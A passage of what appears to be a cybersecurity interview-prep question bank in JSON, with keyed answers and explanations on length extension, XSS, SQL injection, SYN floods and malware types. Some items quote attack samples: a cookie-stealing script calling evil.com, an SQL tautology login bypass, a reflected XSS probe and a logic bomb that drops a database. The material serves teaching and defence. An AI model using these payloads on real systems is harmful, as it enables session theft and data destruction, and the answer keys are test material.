    "question": "A security researcher demonstrates that given a known valid message $M$ and its unkeyed SHA-256 hash $H(M)$, an attacker can append malicious data $M'$ to $M$ and calculate $H(M \\parallel M')$ without knowing the original secret prefix if a naïve `Hash(Secret \\parallel Message)` construction was used. What is this famous cryptographic vulnerability called?",
    "options": {
      "A": "Rowhammer Bit Flipping",
      "B": "Buffer Underrun Attack",
      "C": "Length Extension Attack",
      "D": "Cross-Site Script Inclusion"
    },
    "correct_answer": "C",
    "topic": "Cryptography",
    "subtopic": "Length Extension Attacks on Merkle-Damgård",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "IBM-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Hash functions based on the Merkle–Damgård construction (MD5, SHA-1, SHA-256, SHA-512) output the internal state of the hash engine as the final digest. Because of this, an attacker can use the hash as an initial state to append extra data and calculate a valid hash for the extended message. This is why HMAC (`HMAC = H(K \\oplus opad \\parallel H(K \\oplus ipad \\parallel M))`) was invented.",
    "why_other_options_are_wrong": {
      "A": "Rowhammer is a hardware DRAM electrical disturbance attack flipping physical memory bits.",
      "B": "Buffer underrun is a memory pointer vulnerability, not a cryptographic hash property.",
      "C": "Correct: Length Extension Attacks affect Merkle-Damgård hashes when naïve secret-prefix constructions are used instead of HMAC.",
      "D": "XSSI is a browser JavaScript vulnerability exploiting script tag inclusion."
    },
    "real_world_application": "Flickr API vulnerability in 2009 where API authentication tokens were forged using length extension attacks."
  },
  {
    "id": 44,
    "question": "An IT department deploys full-disk encryption (BitLocker) on all company laptops using AES-XTS. An employee's laptop is stolen while powered OFF. Assuming the thief does not possess the user's PIN or recovery key and cannot crack the password, what can the thief extract from the hard drive?",
    "options": {
      "A": "All plaintext files stored in the root `C:\\` directory",
      "B": "The Windows registry and system event logs in cleartext",
      "C": "All user passwords and cached browser cookies",
      "D": "Only unreadable pseudorandom ciphertext, resulting in zero accessible data"
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Data at Rest Encryption",
    "difficulty": "Medium",
    "question_type": "Application-Based",
    "company_pattern": [
      "Cognizant-style",
      "LTIMindtree-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Full Disk Encryption (FDE) encrypts all sectors of the storage volume at rest. When the machine is powered off, the cryptographic keys are not loaded into volatile RAM. A thief removing the hard drive sees only raw ciphertext indistinguishable from random noise, protecting Confidentiality.",
    "why_other_options_are_wrong": {
      "A": "Root directories and OS binaries are fully encrypted along with user files.",
      "B": "Registry hives are encrypted alongside all other disk sectors.",
      "C": "Cached credentials and registry hives are stored on the encrypted volume and remain inaccessible.",
      "D": "Correct: At-rest volume encryption prevents unauthorized reads when the decryption key is absent."
    },
    "real_world_application": "Meeting HIPAA and GDPR regulatory safe-harbor standards against breach notifications when encrypted laptops are lost or stolen."
  },
  {
    "id": 45,
    "question": "Which of the following represents the correct sequence of actions when an application sends an encrypted, authenticated email using S/MIME or PGP?",
    "options": {
      "A": "1. Hash payload -> 2. Encrypt hash with sender's private key (Signature) -> 3. Generate symmetric session key -> 4. Encrypt payload with session key -> 5. Encrypt session key with recipient's public key",
      "B": "1. Encrypt payload with sender's public key -> 2. Sign with recipient's private key",
      "C": "1. Encrypt payload with CA's private key -> 2. Decrypt with sender's private key",
      "D": "1. Encode with Base64 -> 2. Transmit via plain HTTP -> 3. Decrypt with sender's public key"
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "Comprehensive Hybrid Cryptography Workflow",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Secure hybrid messaging (PGP / S/MIME): The sender hashes the message and encrypts the hash with their own private key (creating the digital signature for authenticity). Next, a random symmetric session key is generated to encrypt the message bulk payload (for speed). Finally, this session key is encrypted with the recipient's public key (so only the recipient can decrypt the session key).",
    "why_other_options_are_wrong": {
      "A": "Correct: This is the exact textbook standard workflow for hybrid asymmetric/symmetric signed and encrypted email.",
      "B": "Senders cannot sign with a recipient's private key; private keys are strictly secret to their owners.",
      "C": "CAs do not encrypt user email payloads with CA private keys.",
      "D": "Base64 over HTTP provides zero confidentiality or integrity."
    },
    "real_world_application": "Sending end-to-end encrypted emails via S/MIME in Microsoft Outlook and PGP/GnuPG."
  },
  {
    "id": 46,
    "question": "A finance executive receives an urgent email that appears to come directly from the company's Chief Financial Officer (CFO). The email references an ongoing confidential corporate acquisition known only to three senior staff members and requests an immediate wire transfer of $250,000 to an offshore vendor account. What specific category of social engineering attack is this?",
    "options": {
      "A": "Mass Phishing",
      "B": "Whaling (Executive Spear Phishing)",
      "C": "Watering Hole Attack",
      "D": "Drive-by Download"
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "Phishing vs Spear Phishing vs Whaling",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Whaling is a highly targeted form of spear phishing aimed specifically at senior executives, high-net-worth individuals, or key finance personnel. It leverages deep reconnaissance and confidential context (often spoofing the CEO or CFO) to authorize fraudulent financial transactions or data releases.",
    "why_other_options_are_wrong": {
      "A": "Mass phishing sends generic, untargeted emails to thousands of indiscriminate recipients simultaneously.",
      "B": "Correct: Targeting high-profile corporate executives with confidential insider context is Whaling.",
      "C": "A Watering Hole attack infects a third-party website frequently visited by the target group.",
      "D": "Drive-by downloads silently install malware when a user visits a compromised web page without user clicks."
    },
    "real_world_application": "Business Email Compromise (BEC) defenses enforcing out-of-band phone verification for wire transfers exceeding company thresholds."
  },
  {
    "id": 47,
    "question": "An IT security technician analyzes an infection spreading across an enterprise office floor. Within 20 minutes, 150 Windows workstations are infected across the corporate subnet. The technician discovers that the malware exploits an unpatched SMBv1 remote code execution vulnerability (MS17-010) to replicate itself across network ports without requiring any human action, email clicking, or file opening. How is this malware classified?",
    "options": {
      "A": "Trojan Horse",
      "B": "Macro Virus",
      "C": "Network Worm",
      "D": "Logic Bomb"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Malware Taxonomy: Worm vs Virus vs Trojan",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A computer Worm is self-replicating, autonomous malware that propagates across computer networks by exploiting software vulnerabilities without requiring human intervention or a host program. In contrast, a Virus requires a host file and user action to execute, while a Trojan relies on social engineering deception.",
    "why_other_options_are_wrong": {
      "A": "A Trojan disguises itself as legitimate software and requires the user to execute it; it does not autonomously propagate across networks.",
      "B": "A Macro Virus attaches to Office documents (Word/Excel) and requires users to open the document and enable macros.",
      "C": "Correct: Autonomous propagation across networks exploiting service vulnerabilities without user interaction defines a Worm.",
      "D": "A Logic Bomb lies dormant until triggered by a specific date, event, or condition."
    },
    "real_world_application": "The global 2017 WannaCry and NotPetya outbreaks which used the EternalBlue SMB exploit as a network worm."
  },
  {
    "id": 48,
    "question": "A user downloads a free utility program called `PC_Speed_Booster.exe` from a third-party website. When run, it displays a convincing progress bar claiming to optimize system RAM. However, in the background, it silently opens port 4444 and establishes a reverse shell connection to an attacker's Command & Control (C2) server. Which malware type does this represent?",
    "options": {
      "A": "Ransomware",
      "B": "Adware",
      "C": "Worm",
      "D": "Trojan Horse"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "Trojan Horse Identification",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Wipro-style",
      "Capgemini-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A Trojan Horse is malicious software that misleads users of its true intent by disguising itself as a legitimate, desirable application while secretly executing harmful background operations (like opening backdoors or exfiltrating data).",
    "why_other_options_are_wrong": {
      "A": "Ransomware encrypts user files and demands payment; it does not masquerade merely as a utility to maintain covert access.",
      "B": "Adware primarily displays unwanted advertisements and pop-ups for revenue generation.",
      "C": "A worm propagates autonomously across the network without requiring a user to download and run it.",
      "D": "Correct: Disguising malicious functionality inside an apparently benign program is the exact definition of a Trojan."
    },
    "real_world_application": "Endpoint Detection and Response (EDR) detecting suspicious reverse TCP connections initiated by unsigned user binaries."
  },
  {
    "id": 49,
    "question": "An employee notices their desktop wallpaper has suddenly been changed to a black screen with red text stating: 'All your files have been encrypted with military-grade AES-256 and RSA-4096. To obtain the private key, deposit 2.5 Bitcoin to the following wallet address within 72 hours.' What is the FIRST and most urgent action the employee or first-responder should take?",
    "options": {
      "A": "Immediately disconnect the computer's Ethernet cable and disable its Wi-Fi adapter to isolate it from the corporate network.",
      "B": "Open the web browser and visit the Bitcoin payment portal to verify the attacker's wallet address.",
      "C": "Run a disk defragmentation utility to reorganize the hard drive sectors.",
      "D": "Send a company-wide email asking colleagues if they have an extra copy of the decryption key."
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "Ransomware Response & Containment",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The immediate first step in ransomware containment is physical and logical network isolation (unplugging Ethernet, disabling Wi-Fi/Bluetooth). This halts lateral movement and stops the malware from spreading to network shared drives, other subnet hosts, and active backup repositories.",
    "why_other_options_are_wrong": {
      "A": "Correct: Rapid network isolation halts the blast radius and prevents encryption of shared mapped drives and adjacent endpoints.",
      "B": "Visiting the payment portal does not contain the outbreak and signals to the attacker that the victim is active.",
      "C": "Running defragmentation writes and moves data across disk sectors, permanently overwriting any recoverable shadow copies or memory artifacts.",
      "D": "Sending emails delays incident response and does not stop the malware from encrypting more files."
    },
    "real_world_application": "NIST SP 800-61 Rev. 2 Incident Handling Guide: Phase 3 - Containment, Eradication, and Recovery."
  },
  {
    "id": 50,
    "question": "A web application's user login form contains two input fields: Username and Password. When an attacker inputs the string `' OR '1'='1` into the username field, the application bypasses password verification and logs the attacker in as the system Administrator. What specific vulnerability and attack occurred?",
    "options": {
      "A": "Cross-Site Scripting (XSS)",
      "B": "SQL Injection (SQLi) via Tautology Manipulation",
      "C": "Buffer Overflow via Stack Smashing",
      "D": "Server-Side Request Forgery (SSRF)"
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "SQL Injection Mechanics",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "TCS-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "This is an SQL Injection (SQLi) tautology attack. When the unsanitized input is concatenated into an SQL string like `SELECT * FROM users WHERE user = '' OR '1'='1' AND pass = '...'`, the condition `'1'='1'` evaluates to TRUE for every record, returning the first row (usually Administrator) and bypassing authentication.",
    "why_other_options_are_wrong": {
      "A": "XSS executes malicious JavaScript inside the victim's web browser, not backend database queries.",
      "B": "Correct: Injecting SQL syntax to alter database query logic is SQL Injection.",
      "C": "Buffer overflows exploit memory bounds in native C/C++ binaries, not relational SQL query strings.",
      "D": "SSRF induces a backend server to make outbound network requests to internal resources."
    },
    "real_world_application": "Remediating OWASP Top 10 A03:2021-Injection by rewriting raw queries using Prepared Statements (Parameterized Queries)."
  },
  {
    "id": 51,
    "question": "Which of the following backend database implementations is the ONLY foolproof, industry-standard defense against SQL Injection vulnerabilities?",
    "options": {
      "A": "Filtering and stripping out the single quote character (`'`) and double hyphens (`--`) using regex",
      "B": "Encrypting the entire SQL query string with AES-256 before passing it to the database engine",
      "C": "Parameterized Queries (Prepared Statements) where SQL code and user-supplied data are treated as fundamentally separate channels",
      "D": "Converting all GET HTTP requests into POST requests"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Defending against SQL Injection",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Infosys-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Parameterized queries (prepared statements) compile the SQL query template first. When user parameters are bound later, the database engine treats user input strictly as literal data values, making it syntactically impossible for user input to alter the structure of the SQL command.",
    "why_other_options_are_wrong": {
      "A": "Blacklist character filtering is notorious for being bypassed by encoding tricks (e.g. hex, unicode, double URL encoding).",
      "B": "The database engine must decrypt the query to execute it, leaving the injected syntax intact.",
      "C": "Correct: Parameterized queries enforce strict separation of code and data, completely neutralizing SQL injection.",
      "D": "POST requests are just as vulnerable to SQL injection as GET requests; HTTP verbs provide no database protection."
    },
    "real_world_application": "Using `PreparedStatement` in Java JDBC or parameterized ORM queries in Hibernate / Entity Framework."
  },
  {
    "id": 52,
    "question": "An attacker discovers that a blog website allows visitors to submit comments that are stored in the database and rendered directly on the page for all other visitors. The attacker submits: `<script>fetch('https://evil.com/steal?c=' + document.cookie);</script>`. When any other user views the blog post, their browser silently transmits their session cookie to the attacker. Which type of Cross-Site Scripting (XSS) is this?",
    "options": {
      "A": "Reflected XSS (Non-Persistent)",
      "B": "Blind SQL Injection",
      "C": "DOM-Based XSS",
      "D": "Stored XSS (Persistent)"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "Cross-Site Scripting (Stored XSS)",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "HCLTech-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Stored (or Persistent) XSS occurs when malicious JavaScript payload is permanently saved on the target server (e.g., in a database, comment field, or profile) and subsequently served to multiple unsuspecting victims when they view the affected page, executing in their browsers.",
    "why_other_options_are_wrong": {
      "A": "Reflected XSS reflects the payload immediately off the server in a single request (e.g., via a search URL parameter) without storing it.",
      "B": "The attack executes browser JavaScript to steal cookies, not backend SQL queries.",
      "C": "DOM-based XSS executes strictly in the client-side JavaScript environment without necessarily touching the server.",
      "D": "Correct: Storing the malicious script in the database so it executes for subsequent visitors is Stored XSS."
    },
    "real_world_application": "Preventing session hijacking by setting the `HttpOnly` flag on session cookies and applying context-aware HTML output encoding."
  },
  {
    "id": 53,
    "question": "A security engineer inspects a web application to prevent Cross-Site Scripting (XSS) attacks from stealing session cookies. Which HTTP response header flag prevents client-side JavaScript (including injected XSS payloads) from accessing the `document.cookie` object?",
    "options": {
      "A": "HttpOnly",
      "B": "SameSite=Strict",
      "C": "Secure",
      "D": "X-Frame-Options: DENY"
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "Mitigating XSS Cookie Theft",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Wipro-style",
      "LTIMindtree-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The `HttpOnly` cookie attribute instructs the browser that the cookie should not be accessible via client-side scripts (such as `document.cookie`). Even if an attacker successfully executes an XSS payload in the victim's browser, the browser blocks access to `HttpOnly` cookies, preventing session hijacking.",
    "why_other_options_are_wrong": {
      "A": "Correct: `HttpOnly` explicitly shields cookies from JavaScript DOM APIs, neutralizing XSS credential theft.",
      "B": "`SameSite=Strict` controls whether cookies are sent on cross-site requests, mitigating Cross-Site Request Forgery (CSRF).",
      "C": "The `Secure` attribute ensures cookies are only transmitted over encrypted HTTPS connections, but allows JS access.",
      "D": "`X-Frame-Options: DENY` prevents Clickjacking by blocking the site from being rendered inside an iframe."
    },
    "real_world_application": "Hardening session management cookies in Spring Boot and Express.js with `res.cookie('session_id', token, { httpOnly: true, secure: true })`."
  },
  {
    "id": 54,
    "question": "How does a Distributed Denial of Service (DDoS) attack fundamentally differ from a traditional single-source Denial of Service (DoS) attack from a defense and mitigation perspective?",
    "options": {
      "A": "DoS attacks target application software, whereas DDoS attacks only target physical ethernet cables.",
      "B": "A DoS attack originates from a single IP address which can be easily blocked by a simple firewall rule, whereas a DDoS attack originates from tens of thousands of geographically dispersed botnet IPs simultaneously, rendering simple IP blocking ineffective.",
      "C": "DDoS attacks can only occur over wireless Wi-Fi networks.",
      "D": "DoS attacks steal passwords, while DDoS attacks erase hard drives."
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "DoS vs DDoS Comparison",
    "difficulty": "Medium-Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In a simple DoS, traffic comes from one machine; dropping packets from that single source IP mitigates the attack. In a DDoS, the attacker commands a distributed botnet (compromised IoT devices, servers, PCs) across hundreds of countries. Blocking individual IPs is futile, requiring upstream volumetric scrubbing centers and Anycast routing.",
    "why_other_options_are_wrong": {
      "A": "Both DoS and DDoS can target any layer of the OSI model (Layer 3/4 network exhaustion or Layer 7 application exhaustion).",
      "B": "Correct: The distributed, multi-source nature of botnets overwhelms single-IP firewall blacklists and saturates uplink bandwidth.",
      "C": "DDoS traffic traverses the global public internet across wired and wireless infrastructures alike.",
      "D": "Denial of service attacks target Availability; they are not designed for data exfiltration or drive wiping."
    },
    "real_world_application": "Deploying Akamai / Cloudflare Anycast scrubbing networks capable of absorbing 2+ Terabit/second volumetric DDoS floods."
  },
  {
    "id": 55,
    "question": "A network security administrator reviews firewall connection tables during an ongoing server slowdown and observes thousands of half-open TCP connections: `TCP 198.51.100.22:443 SYN_RECEIVED`. The clients continuously send SYN packets but never respond to the server's SYN-ACK with an ACK, exhausting the server's connection state memory buffer. What specific attack is being executed?",
    "options": {
      "A": "Ping of Death",
      "B": "Smurf Attack",
      "C": "SYN Flood Attack",
      "D": "SQL Injection"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Network Protocol Attacks (SYN Flood)",
    "difficulty": "Hard",
    "question_type": "Log or Event Analysis",
    "company_pattern": [
      "Infosys-style",
      "Capgemini-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A TCP SYN Flood exploits the 3-way handshake. The attacker sends massive volumes of SYN packets with spoofed source IPs. The server allocates kernel memory for each connection in its backlog queue and responds with SYN-ACK, waiting in the `SYN_RECEIVED` state. Because no ACK arrives, the queue fills up, denying legitimate new connections.",
    "why_other_options_are_wrong": {
      "A": "Ping of Death sends oversized ICMP packets larger than 65,535 bytes to crash legacy IP stacks.",
      "B": "A Smurf attack broadcasts ICMP Echo requests to an amplification network with a spoofed victim IP.",
      "C": "Correct: Flooding SYN packets leaving connections in `SYN_RECEIVED` state to exhaust connection queues is a SYN Flood.",
      "D": "SQL injection is an application-layer database attack, completely unrelated to TCP state tables."
    },
    "real_world_application": "Enabling SYN Cookies (`sysctl -w net.ipv4.tcp_syncookies=1`) on Linux servers to avoid allocating state until the handshake completes."
  },
  {
    "id": 56,
    "question": "An attacker sitting in a local coffee shop broadcasts fake ARP replies across the local Wi-Fi subnet claiming that their own MAC address is associated with the default gateway's IP address (192.168.1.1). Consequently, all laptops on the Wi-Fi send their outbound internet traffic directly through the attacker's machine. What type of attack is this, and what is the primary threat?",
    "options": {
      "A": "Ransomware infection enabling Drive Encryption",
      "B": "Cross-Site Request Forgery (CSRF) enabling Remote Code Execution",
      "C": "Buffer Overflow enabling Denial of Service",
      "D": "ARP Poisoning / Spoofing enabling a Man-in-the-Middle (MITM) attack"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "Man-in-the-Middle (ARP Spoofing)",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Cognizant-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Because Address Resolution Protocol (ARP) is stateless and lacks authentication, devices accept unsolicited ARP replies. ARP Poisoning allows an attacker to associate their MAC address with the router's IP, positioning themselves directly in the path of all local communications to eavesdrop, tamper, or intercept credentials (MITM).",
    "why_other_options_are_wrong": {
      "A": "ARP spoofing redirects network packets; it does not execute ransomware encryption on disks.",
      "B": "CSRF tricks a victim's browser into submitting unwanted actions on an authenticated website, unrelated to Layer 2 ARP.",
      "C": "Buffer overflows exploit memory management in applications, not Layer 2 Ethernet frame routing.",
      "D": "Correct: Poisoning the local subnet's ARP cache to intercept client traffic is classic ARP Spoofing / MITM."
    },
    "real_world_application": "Enabling Dynamic ARP Inspection (DAI) and 802.1X port authentication on managed Cisco enterprise switches."
  },
  {
    "id": 57,
    "question": "A web security scanner flags an issue where an attacker who has positioned themselves as a Man-in-the-Middle intercepts an initial unencrypted HTTP connection (`http://mybank.com`) and intercepts the 301 Redirect to HTTPS, continuing to serve the user an unencrypted HTTP version while communicating with the bank over HTTPS in the background. What is this attack called, and what security control was specifically created to prevent it?",
    "options": {
      "A": "SSL Stripping, prevented by HTTP Strict Transport Security (HSTS)",
      "B": "SQL Injection, prevented by Web Application Firewalls",
      "C": "DNS Amplification, prevented by BGP Anycast",
      "D": "Clickjacking, prevented by Content Security Policy"
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "SSL Stripping & HSTS Defense",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Deloitte-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "SSL Stripping (introduced by Moxie Marlinspike) downgrades secure HTTPS links to plain unencrypted HTTP. HTTP Strict Transport Security (HSTS - RFC 6797) instructs browsers via the `Strict-Transport-Security` header to ONLY ever connect to the site using HTTPS, automatically upgrading any HTTP link client-side before any packet leaves the machine.",
    "why_other_options_are_wrong": {
      "A": "Correct: SSL Stripping downgrades HTTPS to HTTP; HSTS mandates browser-side HTTPS enforcement to prevent it.",
      "B": "SQL injection attacks backend database parameters, not transport-layer TLS redirects.",
      "C": "DNS Amplification exploits open DNS resolvers for volumetric DDoS.",
      "D": "Clickjacking overlays transparent UI layers to trick users into clicking hidden buttons."
    },
    "real_world_application": "Configuring `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` and submitting domains to the HSTS Preload list."
  },
  {
    "id": 58,
    "question": "An authentication log shows 10,000 login attempts against an enterprise customer portal in 15 minutes. Crucially, the attacker does not attempt 10,000 passwords against a single user account. Instead, the attacker attempts just ONE common password ('Summer2025!') across 10,000 distinct usernames. What specialized attack technique is this, and why is it used?",
    "options": {
      "A": "Rainbow Table Attack, used to bypass salt entropy",
      "B": "Password Spraying, used to avoid triggering per-user account lockout thresholds",
      "C": "Timing Attack, used to measure cryptographic comparison latency",
      "D": "ARP Spoofing, used to rewrite MAC addresses in the switch CAM table"
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "Brute Force vs Password Spraying",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Password Spraying tests a single or small handful of common, seasonal passwords against thousands of user accounts. Traditional brute force (trying thousands of passwords on one user) triggers account lockouts after 3-5 failed attempts. Spraying keeps attempts below the individual lockout threshold while still breaching users who pick weak passwords.",
    "why_other_options_are_wrong": {
      "A": "Rainbow tables crack stolen offline password hashes, not live online web login endpoints.",
      "B": "Correct: Password spraying tests one password across many accounts to fly under account lockout radars.",
      "C": "Timing attacks measure microsecond differences in server processing times.",
      "D": "ARP spoofing manipulates local Ethernet frames on a LAN, not application login forms."
    },
    "real_world_application": "Deploying behavioral IP rate-limiting, CAPTCHA on failed site-wide attempts, and Microsoft Entra ID Smart Lockout."
  },
  {
    "id": 59,
    "question": "An attacker acquires a massive database dump of 50 million email-and-password pairs leaked from a compromised gaming forum. The attacker loads these credentials into an automated bot that tests them against online banking portals, social media platforms, and e-commerce websites. What attack is being conducted?",
    "options": {
      "A": "Man-in-the-Middle",
      "B": "SQL Injection",
      "C": "Credential Stuffing",
      "D": "Watering Hole Attack"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Credential Stuffing Mechanics",
    "difficulty": "Medium-Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Capgemini-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Credential Stuffing is the automated injection of breached username/password pairs across multiple unrelated web applications, exploiting the widespread human habit of reusing identical passwords across different services.",
    "why_other_options_are_wrong": {
      "A": "Man-in-the-Middle intercepts communications in flight between two active parties.",
      "B": "SQL Injection exploits backend SQL query syntax flaws, not stolen valid credentials.",
      "C": "Correct: Reusing leaked credentials from one breach to compromise accounts on other services is Credential Stuffing.",
      "D": "Watering Hole compromises websites frequented by a specific target demographic."
    },
    "real_world_application": "Enforcing Multi-Factor Authentication (MFA) and monitoring HaveIBeenPwned API feeds to force password resets on breached accounts."
  },
  {
    "id": 60,
    "question": "A security analyst reviews web server access logs and finds the following entry: `GET /search.php?query=<img+src=x+onerror=alert(document.domain)> HTTP/1.1 200`. The user who clicked this URL observed a JavaScript pop-up box displaying the domain name. However, when other users visit the search page directly, no pop-up occurs. Which vulnerability is this?",
    "options": {
      "A": "Path Traversal",
      "B": "Stored Cross-Site Scripting (Persistent XSS)",
      "C": "Remote File Inclusion (RFI)",
      "D": "Reflected Cross-Site Scripting (Non-Persistent XSS)"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "Reflected XSS Analysis",
    "difficulty": "Hard",
    "question_type": "Log or Event Analysis",
    "company_pattern": [
      "Cognizant-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Reflected XSS occurs when unvalidated user input provided in an HTTP request (such as a search query parameter) is immediately reflected back in the server's immediate HTTP response page without being stored. It only executes for the specific victim who clicks the crafted malicious link.",
    "why_other_options_are_wrong": {
      "A": "Path Traversal uses `../` sequences to access unauthorized directories on the server's local file system.",
      "B": "Stored XSS saves the script in the database so that everyone who visits the page is affected, which was ruled out.",
      "C": "Remote File Inclusion involves executing code hosted on a remote external server into the server-side runtime.",
      "D": "Correct: Immediate reflection of input without server-side database storage is Reflected (Non-Persistent) XSS."
    },
    "real_world_application": "Remediating reflected parameters by ensuring all user input rendered into HTML is sanitized with contextual HTML entity encoding."
  },
  {
    "id": 61,
    "question": "An attacker creates a convincing clone of a corporate HR benefits login portal. They send an email to all staff: 'Open Enrollment closes at 5 PM! Click here to confirm your health insurance coverage.' When employees click the link, they are taken to the clone site and enter their corporate usernames, passwords, and 2FA SMS codes, which the attacker captures in real-time. Which attack does this describe?",
    "options": {
      "A": "Phishing via Adversary-in-the-Middle (AiTM) Reverse Proxy",
      "B": "SQL Injection",
      "C": "Buffer Overflow",
      "D": "Distributed Denial of Service"
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "Modern Phishing Techniques",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "This describes modern phishing using an Adversary-in-the-Middle (AiTM) reverse proxy (tools like Evilginx). By cloning the legitimate site and proxying requests in real-time, the attacker intercepts not only passwords but also dynamic multi-factor authentication session tokens and cookies.",
    "why_other_options_are_wrong": {
      "A": "Correct: Tricking users into entering credentials and MFA tokens into a deceptive replica site is Phishing (specifically AiTM).",
      "B": "SQL Injection exploits database parameters, not email-based credential deception.",
      "C": "Buffer overflows target memory allocation in executable software.",
      "D": "DDoS attacks saturate availability, whereas phishing is focused on credential theft."
    },
    "real_world_application": "Transitioning from phishable MFA (SMS/push notifications) to FIDO2 / WebAuthn hardware security keys (YubiKeys) which bind to the origin domain."
  },
  {
    "id": 62,
    "question": "What is the key technical difference between a Computer Virus and a Computer Worm?",
    "options": {
      "A": "A virus only targets Linux systems, while a worm only targets Windows systems.",
      "B": "A virus attaches itself to a host file/program and requires user action (execution) to spread, whereas a worm is a standalone program that replicates and spreads across networks autonomously without user intervention.",
      "C": "A virus is encrypted, while a worm is transmitted in plaintext.",
      "D": "A virus encrypts user data for ransom, while a worm is exclusively used for mining cryptocurrency."
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "Virus vs Worm Distinction",
    "difficulty": "Medium-Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "Wipro-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A Virus cannot stand alone; it must attach its code to an existing legitimate host executable or document, activating only when a user executes the infected file. A Worm is completely independent, needing no host program and no human intervention to replicate across network sockets.",
    "why_other_options_are_wrong": {
      "A": "Both viruses and worms can target any operating system architecture.",
      "B": "Correct: Virus requires a host program and user trigger; Worm is self-contained and autonomously propagates across networks.",
      "C": "Both malware types can be polymorphic, packed, or encrypted.",
      "D": "Payloads vary widely; viruses and worms are classified by their replication and propagation mechanisms, not their ultimate payload."
    },
    "real_world_application": "Designing firewall and host isolation rules to contain self-propagating worms compared to endpoint antivirus scanning files for viruses."
  },
  {
    "id": 63,
    "question": "A rogue insider in an engineering department is notified that their employment will be terminated in 30 days. The employee silently commits a hidden script into the source code repository: `if (current_date > '2026-11-01') { drop_database_cascade(); }`. What specific form of malicious logic is this?",
    "options": {
      "A": "Rootkit",
      "B": "Spyware",
      "C": "Logic Bomb",
      "D": "Cross-Site Scripting"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Logic Bomb Characteristics",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Capgemini-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
